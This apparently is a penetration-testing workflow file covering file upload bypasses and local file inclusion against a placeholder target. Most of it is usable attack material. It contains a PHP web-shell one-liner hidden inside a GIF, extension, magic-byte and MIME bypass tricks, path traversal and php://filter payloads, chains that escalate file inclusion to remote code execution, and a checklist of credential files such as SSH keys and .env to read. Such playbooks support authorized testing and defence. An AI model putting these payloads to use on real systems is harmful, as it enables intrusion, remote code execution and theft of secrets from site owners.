# File Upload & LFI — Deep Workflows

Companion to SKILL.md. Upload bypass matrix, LFI-to-RCE chains.

## Part A: Upload exploitation ladder

### Step 1: Baseline behavior mapping

```bash
# Upload a benign file; record WHERE it lands and HOW it is served:
# - Original filename kept?  Content-Type echoed?  Executed or downloaded?
curl -s -F "file=@test.png;type=image/png" https://target.example.com/upload
GET /uploads/<uuid>/test.png   -> note headers (Content-Type, X-Content-Type-Options)
```

### Step 2: Extension bypass matrix

```text
Case:        .PhP .Php5 .PHTML
Double:      shell.php.jpg  shell.jpg.php  shell.php%00.jpg (legacy nulls)
Trailing:    shell.php.  shell.php..  shell.php... .(spaces) %20 %0a
Alternates:  .phtml .phar .phps(served source) .pgif .shtml .cer .asa .aspx
             .jsp .jspx .war .ashx .asmx .cgi .pl .py .htaccess(if served)
Dot tricks:  shell.php:.jpg (NTFS ADS, IIS)   shell.php/
```

### Step 3: Content-Type & magic-byte bypass

```bash
# Real GIF with PHP tail:
cp shell.php shell.gif && printf '<?php system($_GET["c"]);?>' >> shell.gif
# Or prepend valid magic bytes:
printf 'GIF89a' | cat - shell.php > shell.gif.php

# MIME lying:
curl -F "file=@shell.php;type=image/png" ...
```

### Step 4: Post-upload execution hunting

```text
- Direct hit: /uploads/shell.gif?c=id        (if server executes by ext)
- Path discovery: error leaks, dir listing, predictable uuid/name,
  response JSON containing URL, fuzz /files/ /static/ /media/ /img/
- Image processors (ImageMagick/ImageTragick class, ffmpeg HLS):
  crafted media files reaching converter = documented RCE classes
```

## Part B: LFI / path traversal

### Step 1: Detection

```bash
?file=report.pdf
?file=../../../../etc/passwd          -> passwd lines?
?file=....//....//etc/passwd          (filter strip bypass)
?file=%2e%2e%2f%2e%2e%2fetc/passwd    (URL decode once server-side)
?file=..%252f..%252f                  (double decode when app decodes twice)
?file=/etc/passwd                     (absolute accepted?)
?file=php://filter/convert.base64-encode/resource=index.php   (PHP)
```

Windows targets: `..\..\..\windows\win.ini`, `....\\....\\`,
`C:/` absolute paths.

### Step 2: LFI to RCE chains (documented techniques)

```text
1. Log poisoning: include access/error log after injecting PHP via UA
   (requires log readable + PHP in included file context).
2. php://input + allow_url_include=On (rare now).
3. Session files: /tmp/sess_<sid> if session data contains injected PHP.
4. /proc/self/environ readable -> inject via User-Agent historically.
5. File upload + LFI combo: upload image-with-PHP, include it.
6. /proc/self/cmdline + fd enumeration for arg-injected code.
```

Each chain requires its precondition verified BEFORE claiming RCE.

### Step 3: Sensitive-file checklist for proof

```bash
/etc/passwd  /etc/hostname  /proc/version
.env  config/database.yml  appsettings.json  WEB-INF/web.xml
~/.ssh/id_rsa  /proc/self/environ (redact values!)
```

Show ONE file as proof; do not dump secrets wholesale into reports.

## False-positive elimination

1. Upload "executed"? Verify server-side execution (response differs per
   ?c= param), not client-side content sniffing.
2. Traversal success must show REAL target file bytes, not error echo.
3. WAF may normalize only one layer — confirm final byte-level request.
